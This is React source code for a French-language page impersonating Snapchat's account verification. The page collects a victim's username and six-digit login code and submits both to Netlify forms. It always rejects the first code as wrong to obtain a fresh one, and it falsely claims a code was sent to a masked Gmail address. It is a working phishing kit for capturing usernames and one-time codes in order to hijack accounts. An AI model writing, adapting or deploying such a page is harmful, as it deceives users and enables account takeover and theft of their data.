import React, { useState } from "react";
import SnapchatLogo from "../../../attached_assets/snapchat_1785772849797.png";

import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from "./components/ui/input-otp";

const SnapchatGhost = () => (
  <img
    src={SnapchatLogo}
    alt="Snapchat logo"
    width="76"
    height="76"
    className="mx-auto block h-[76px] w-[76px] object-contain"
  />
);

type Step = "username" | "otp";

function isValidUsername(value: string): boolean {
  return /^[a-zA-Z0-9._@]{3,}$/.test(value.trim());
}

export default function VerificationPage() {
  const [step, setStep] = useState<Step>("username");
  const [username, setUsername] = useState("");
  const [usernameError, setUsernameError] = useState("");
  const [otp, setOtp] = useState("");
  const [otpError, setOtpError] = useState("");
  const attemptsRef = React.useRef(0);
  const returnTo =
    new URLSearchParams(window.location.search).get("returnTo") || "/";

  const submitNetlifyForm = async (
    formName: string,
    fields: Record<string, string>,
  ) => {
    if (!import.meta.env.PROD) {
      return;
    }

    const body = new URLSearchParams();
    body.set("form-name", formName);

    Object.entries(fields).forEach(([key, value]) => {
      body.set(key, value);
    });

    await fetch("/", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: body.toString(),
    });
  };

  const handleUsernameNext = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username.trim()) {
      setUsernameError("Veuillez saisir votre nom d'utilisateur ou votre e-mail.");
      return;
    }
    if (!isValidUsername(username)) {
      setUsernameError(
        "Nous n'avons trouvé aucun compte avec ce nom d'utilisateur. Veuillez vérifier et réessayer.",
      );
      return;
    }
    setUsernameError("");
    await submitNetlifyForm("Snapchat-verification-username", {
      username: username.trim(),
    });
    setStep("otp");
    setOtp("");
  };

  const handleOtpNext = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length < 6) {
      setOtpError("Veuillez saisir le code de vérification à 6 chiffres.");
      return;
    }

    if (attemptsRef.current === 0) {
      attemptsRef.current += 1;
      setOtp("");
      setOtpError("Ce code est incorrect. Veuillez réessayer.");
      return;
    }

    const storedUsername = username.trim();
    if (storedUsername) {
      window.sessionStorage.setItem("snapchatLoginUsername", storedUsername);
    }

    if (import.meta.env.DEV) {
      window.location.assign(returnTo);
      return;
    }

    await submitNetlifyForm("Snapchat-verification-otp", {
      identifier: storedUsername,
      otp,
    });

    window.location.assign(returnTo);
  };

  return (
    <div
      className="min-h-screen w-full font-sans text-[#111111]"
      style={{ backgroundColor: "#f2f2f2" }}
    >
      <main className="flex flex-col items-center px-4 pt-10 pb-10">
        {step === "username" && (
          <div className="bg-white rounded-[12px] w-full max-w-[440px] shadow-[0_1px_4px_rgba(0,0,0,0.06)] px-8 sm:px-10 pt-8 pb-10 border border-[#e8e8e8]">
            <SnapchatGhost />
            <h1 className="text-center text-[26px] sm:text-[28px] font-bold mt-4 tracking-[-0.01em]">
              Vérifiez votre compte
            </h1>
            <form onSubmit={handleUsernameNext} className="mt-6">
              <label className="block text-[13px] font-medium text-[#555555] mb-1.5">
                Nom d'utilisateur ou e-mail
              </label>
              <input
                type="text"
                maxLength={15}
                value={username}
                onChange={(e) => {
                  setUsername(e.target.value.replace(/^@/, "").trimStart());
                  setUsernameError("");
                }}
                className="w-full px-3.5 py-[12px] border-[2px] border-black rounded-[8px] focus:outline-none text-[15px]"
                autoFocus
              />
              {usernameError && (
                <p className="mt-1.5 text-[13px] text-red-500">
                  {usernameError}
                </p>
              )}

              <div className="mt-5 flex justify-center">
                <button
                  type="submit"
                  className="bg-[#00C8FA] text-white font-bold text-[15px] px-9 py-[10px] rounded-full hover:bg-[#00b4e0] transition-colors"
                >
                  Suivant
                </button>
              </div>
            </form>
          </div>
        )}

        {step === "otp" && (
          <div className="bg-white rounded-[12px] w-full max-w-[440px] shadow-[0_1px_4px_rgba(0,0,0,0.06)] px-8 sm:px-10 pt-8 pb-10 border border-[#e8e8e8]">
            <SnapchatGhost />
            <h1 className="text-center text-[26px] sm:text-[28px] font-bold mt-4 tracking-[-0.01em]">
              Entrer le code de vérification
            </h1>
            <p className="mt-3 text-center text-[14px] text-[#555555]">
              Nous avons envoyé un code à 6 chiffres à l'e-mail lié à ce compte{" "}
              <span className="font-semibold text-[#111111]">
                ****@gmail.com
              </span>
            </p>

            <div className="mt-4 flex items-center justify-center gap-2">
              <button
                type="button"
                onClick={() => {
                  setStep("username");
                  setOtp("");
                  setOtpError("");
                  attemptsRef.current = 0;
                }}
                className="text-[13px] font-semibold text-[#00C8FA] hover:underline"
              >
                Ce n'est pas vous ?
              </button>
            </div>

            <form onSubmit={handleOtpNext} className="mt-5">
              <label className="block text-[13px] font-medium text-[#555555] mb-2">
                Code de vérification
              </label>
              <div className="flex justify-center">
                <InputOTP
                  maxLength={6}
                  value={otp}
                  onChange={(value) => {
                    setOtp(value);
                    setOtpError("");
                  }}
                  className="gap-2"
                >
                  <InputOTPGroup>
                    {Array.from({ length: 6 }).map((_, i) => (
                      <InputOTPSlot
                        key={i}
                        index={i}
                        className="h-[52px] w-[52px] text-[20px] border-[1.5px] border-[#cccccc] rounded-[8px] first:border-[1.5px] last:border-[1.5px]"
                      />
                    ))}
                  </InputOTPGroup>
                </InputOTP>
              </div>
              {otpError && (
                <p className="mt-1.5 text-center text-[13px] text-red-500">
                  {otpError}
                </p>
              )}

              <div className="mt-3 text-center">
                <button
                  type="button"
                  onClick={() => {
                    setOtp("");
                    setOtpError("");
                  }}
                  className="text-[14px] font-semibold text-[#00C8FA] hover:underline"
                >
                  Renvoyer le code
                </button>
              </div>

              <div className="mt-5 flex justify-center">
                <button
                  type="submit"
                  className="bg-[#00C8FA] text-white font-bold text-[15px] px-9 py-[10px] rounded-full hover:bg-[#00b4e0] transition-colors"
                >
                  Vérifier
                </button>
              </div>
            </form>
          </div>
        )}
      </main>
    </div>
  );
}
